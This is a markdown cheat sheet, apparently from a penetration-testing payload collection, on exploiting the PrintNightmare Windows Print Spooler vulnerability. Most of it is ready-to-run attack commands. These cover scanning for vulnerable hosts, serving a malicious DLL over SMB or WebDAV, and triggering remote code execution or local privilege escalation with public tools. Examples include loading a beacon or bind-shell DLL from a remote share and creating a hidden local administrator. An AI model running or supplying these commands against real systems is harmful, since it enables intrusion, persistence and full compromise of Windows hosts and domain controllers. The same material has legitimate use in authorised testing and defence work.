# PrintNightmare

> CVE-2021-1675 / CVE-2021-34527

The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
The exploit will execute the DLL either from the local filesystem or a remote share.

Requirements:

* **Spooler Service** enabled (Mandatory)
* Server with patches < June 2021
* DC with `Pre Windows 2000 Compatibility` group
* Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
* Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0


**Detect the vulnerability**:

* Impacket - [rpcdump](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/rpcdump.py)
  ```ps1
  python3 ./rpcdump.py @10.0.2.10 | egrep 'MS-RPRN|MS-PAR'
  Protocol: [MS-RPRN]: Print System Remote Protocol
  ```
* [It Was All A Dream](https://github.com/byt3bl33d3r/ItWasAllADream) 
  ```ps1
  git clone https://github.com/byt3bl33d3r/ItWasAllADream
  cd ItWasAllADream && poetry install && poetry shell
  itwasalladream -u user -p Password123 -d domain 10.10.10.10/24
  docker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10
  ```

**Payload Hosting**: 

* The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109):
  ```ps1
  python3 ./smbserver.py share /tmp/smb/
  ```
* Using [Invoke-BuildAnonymousSMBServer](https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer/blob/main/Invoke-BuildAnonymousSMBServer.ps1) (Admin rights required on host): 
  ```ps1
  Import-Module .\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\Share -Mode Enable
  ```
* Using WebDav with [SharpWebServer](https://github.com/mgeeky/SharpWebServer) (Doesn't require admin rights):
  ```ps1
  SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
  ```

When using WebDav instead of SMB, you must add `@[PORT]` to the hostname in the URI, e.g.: `\\172.16.1.5@8888\Downloads\beacon.dll`
WebDav client **must** be activated on exploited target. By default it is not activated on Windows workstations (you have to `net start webclient`) and it's not installed on servers. Here is how to detect activated webdav:

```ps1
nxc smb -u user -p password -d domain.local -M webdav [TARGET]
```

**Trigger the exploit**: 

* [SharpNightmare](https://github.com/cube0x0/CVE-2021-1675)
  ```powershell
  # require a modified Impacket: https://github.com/cube0x0/impacket
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
  python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
  ## LPE
  SharpPrintNightmare.exe C:\addCube.dll
  ## RCE using existing context
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
  ## RCE using runas /netonly
  SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
  ```
* [Invoke-Nightmare](https://github.com/calebstewart/CVE-2021-1675)
  ```powershell
  ## LPE only (PS1 + DLL)
  Import-Module .\cve-2021-1675.ps1
  Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
  Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
  Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
  ```
* [Mimikatz v2.2.0-20210709+](https://github.com/gentilkiwi/mimikatz/releases)
  ```powershell
  ## LPE
  misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
  ## RCE
  misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
  ```
* [PrintNightmare - @outflanknl](https://github.com/outflanknl/PrintNightmare)
  ```powershell
  PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]
  ```

**Debug informations**

| Error  | Message               | Debug                                    |
|--------|-----------------------|------------------------------------------|
| 0x5    | `rpc_s_access_denied` | Permissions on the file in the SMB share |
| 0x525  | `ERROR_NO_SUCH_USER`  | The specified account does not exist.    |
| 0x180  | unknown error code    | Share is not SMB2                        |


## References

* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
* [A Practical Guide to PrintNightmare in 2024 - itm4n - Jan 28, 2024](https://itm4n.github.io/printnightmare-exploitation/)